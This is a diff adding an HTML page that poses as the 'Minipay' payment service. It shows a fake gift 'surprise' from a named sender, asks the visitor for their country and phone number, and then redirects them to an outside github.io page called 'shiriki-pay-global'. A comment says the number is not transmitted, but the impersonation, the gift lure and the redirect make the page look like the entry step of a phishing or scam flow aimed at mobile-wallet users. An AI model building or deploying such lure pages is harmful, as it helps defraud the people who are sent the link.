@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Minipay</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    font-family: Arial, sans-serif;
+    background:
+        linear-gradient(rgba(255,255,255,.06) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,.06) 1px, transparent 1px),
+        #006b20;
+    background-size: 59px 59px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+/* TOP */
+.topbar {
+    position: absolute;
+    top: 25px;
+    left: 30px;
+    right: 30px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.logo {
+    font-size: 28px;
+    font-weight: 800;
+    color: #000;
+}
+
+.menu {
+    background: rgba(255,255,255,.7);
+    border-radius: 30px;
+    padding: 12px 20px;
+}
+
+/* COMMON CARD */
+.card {
+    width: min(92%, 480px);
+    background: #fffdf6;
+    border: 3px solid #e4aa00;
+    border-radius: 25px;
+    padding: 30px 25px;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,.35);
+    animation: appear .45s ease;
+}
+
+@keyframes appear {
+    from {
+        opacity: 0;
+        transform: scale(.85);
+    }
+    to {
+        opacity: 1;
+        transform: scale(1);
+    }
+}
+
+/* POPUP */
+#countryScreen {
+    display: none;
+}
+
+.close {
+    float: right;
+    width: 42px;
+    height: 42px;
+    border-radius: 50%;
+    border: 2px solid #e0a600;
+    background: white;
+    font-size: 25px;
+    cursor: pointer;
+}
+
+.gift {
+    font-size: 95px;
+    animation: bounce 1.5s infinite;
+}
+
+@keyframes bounce {
+    50% {
+        transform: translateY(-10px);
+    }
+}
+
+.small {
+    font-size: 22px;
+    font-weight: bold;
+    color: #073b27;
+}
+
+.surprise {
+    font-size: 52px;
+    font-weight: 900;
+    color: #d68b00;
+}
+
+.from {
+    color: #073b27;
+    font-size: 20px;
+}
+
+.name {
+    color: #073b27;
+    font-size: 28px;
+    font-weight: 800;
+    margin-top: 5px;
+}
+
+.ready {
+    margin: 22px 0;
+    padding: 15px;
+    border-radius: 17px;
+    background: #eaf7e9;
+    color: #075b2d;
+    font-size: 19px;
+}
+
+.team {
+    font-family: cursive;
+    font-size: 29px;
+    color: #073b27;
+}
+
+.minipay {
+    font-size: 32px;
+    font-weight: 900;
+    color: #073b27;
+}
+
+.minipay::before {
+    content: "➤";
+    color: #ef002d;
+    margin-right: 8px;
+}
+
+.open-btn,
+.continue-btn {
+    width: 100%;
+    height: 54px;
+    margin-top: 22px;
+    border: 0;
+    border-radius: 30px;
+    background: #00852b;
+    color: white;
+    font-size: 19px;
+    font-weight: 800;
+    cursor: pointer;
+}
+
+.open-btn:hover,
+.continue-btn:hover {
+    background: #006d24;
+}
+
+/* COUNTRY SCREEN */
+.country-title {
+    color: #075b2d;
+    font-size: 27px;
+    margin-top: 20px;
+}
+
+.country-subtitle {
+    color: #666;
+    margin-bottom: 22px;
+}
+
+select,
+input {
+    width: 100%;
+    height: 54px;
+    border: 1px solid #ccc;
+    border-radius: 13px;
+    padding: 0 14px;
+    font-size: 16px;
+    background: white;
+}
+
+.phone-area {
+    display: none;
+    margin-top: 20px;
+    text-align: left;
+}
+
+.phone-label {
+    display: block;
+    font-weight: bold;
+    margin-bottom: 8px;
+    color: #333;
+}
+
+.phone-row {
+    display: flex;
+    gap: 8px;
+}
+
+.code {
+    min-width: 78px;
+    height: 54px;
+    background: #eaf7e9;
+    color: #075b2d;
+    border-radius: 13px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+}
+
+.phone-row input {
+    flex: 1;
+}
+
+.message {
+    text-align: center;
+    margin-top: 15px;
+    font-size: 15px;
+    color: #075b2d;
+}
+</style>
+</head>
+
+<body>
+
+<div class="topbar">
+    <div class="logo">Minipay</div>
+    <div class="menu">••• &nbsp; ×</div>
+</div>
+
+
+<!-- =========================
+     SCREEN 1: SURPRISE
+========================= -->
+
+<div class="card" id="surpriseScreen">
+
+    <button class="close" onclick="closePopup()">×</button>
+
+    <div class="gift">🎁</div>
+
+    <div class="small">
+        You have a
+    </div>
+
+    <div class="surprise">
+        Surprise
+    </div>
+
+    <div class="from">
+        from
+    </div>
+
+    <div class="name">
+        Fransesco Jade Marie.
+    </div>
+
+    <div class="ready">
+        🎁 &nbsp; Box <strong>ready to open.</strong>
+    </div>
+
+    <div class="team">
+        The team
+    </div>
+
+    <div class="minipay">
+        Minipay
+    </div>
+
+    <button class="open-btn" id="openButton">
+        Open Now &nbsp; ›
+    </button>
+
+</div>
+
+
+<!-- =========================
+     SCREEN 2: COUNTRY
+========================= -->
+
+<div class="card" id="countryScreen">
+
+    <button class="close" id="backButton">×</button>
+
+    <div style="font-size:60px;">🌍</div>
+
+    <h2 class="country-title">
+        Choose your country
+    </h2>
+
+    <p class="country-subtitle">
+        Select your country to continue
+    </p>
+
+    <select id="country">
+        <option value="">Select country</option>
+        <option value="+1">🇺🇸 United States (+1)</option>
+        <option value="+44">🇬🇧 United Kingdom (+44)</option>
+        <option value="+49">🇩🇪 Germany (+49)</option>
+        <option value="+55">🇧🇷 Brazil (+55)</option>
+        <option value="+47">🇳🇴 Norway (+47)</option>
+        <option value="+254">🇰🇪 Kenya (+254)</option>
+        <option value="+256">🇺🇬 Uganda (+256)</option>
+        <option value="+234">🇳🇬 Nigeria (+234)</option>
+    </select>
+
+
+    <div class="phone-area" id="phoneArea">
+
+        <label class="phone-label">
+            Phone number
+        </label>
+
+        <div class="phone-row">
+
+            <div class="code" id="countryCode">
+                +254
+            </div>
+
+            <input
+                id="phone"
+                type="tel"
+                inputmode="numeric"
+                placeholder="Enter phone number"
+                autocomplete="tel"
+            >
+
+        </div>
+
+        <button class="continue-btn" id="continueButton">
+            Continue →
+        </button>
+
+        <div class="message" id="message"></div>
+
+    </div>
+
+</div>
+
+
+<script>
+
+const surpriseScreen =
+    document.getElementById("surpriseScreen");
+
+const countryScreen =
+    document.getElementById("countryScreen");
+
+const openButton =
+    document.getElementById("openButton");
+
+const backButton =
+    document.getElementById("backButton");
+
+const country =
+    document.getElementById("country");
+
+const phoneArea =
+    document.getElementById("phoneArea");
+
+const countryCode =
+    document.getElementById("countryCode");
+
+const phone =
+    document.getElementById("phone");
+
+const continueButton =
+    document.getElementById("continueButton");
+
+const message =
+    document.getElementById("message");
+
+
+/* OPEN SURPRISE */
+
+openButton.addEventListener("click", function () {
+
+    surpriseScreen.style.display = "none";
+    countryScreen.style.display = "block";
+
+});
+
+
+/* BACK */
+
+backButton.addEventListener("click", function () {
+
+    countryScreen.style.display = "none";
+    surpriseScreen.style.display = "block";
+
+});
+
+
+/* COUNTRY SELECTED */
+
+country.addEventListener("change", function () {
+
+    if (!country.value) {
+
+        phoneArea.style.display = "none";
+        return;
+
+    }
+
+    countryCode.textContent = country.value;
+
+    phoneArea.style.display = "block";
+
+    phone.value = "";
+    message.textContent = "";
+
+    phone.focus();
+
+});
+
+
+/* CONTINUE */
+
+continueButton.addEventListener("click", function () {
+
+    const number = phone.value.trim();
+
+    if (!country.value) {
+        message.textContent =
+            "Please select your country.";
+        return;
+    }
+
+    if (!number) {
+        message.textContent =
+            "Please enter your phone number.";
+        return;
+    }
+
+    if (!/^[0-9\s-]{5,20}$/.test(number)) {
+
+        message.textContent =
+            "Please enter a valid phone number.";
+
+        return;
+    }
+
+    /*
+      Demo only:
+      The phone number is not transmitted anywhere.
+    */
+window.location.href =
+    "https://internationalchat.github.io/shiriki-pay-global/";
+
+});
+
+
+/* CLOSE */
+
+function closePopup() {
+
+    surpriseScreen.style.display = "none";
+
+}
+
+</script>
+
+</body>
+</html>
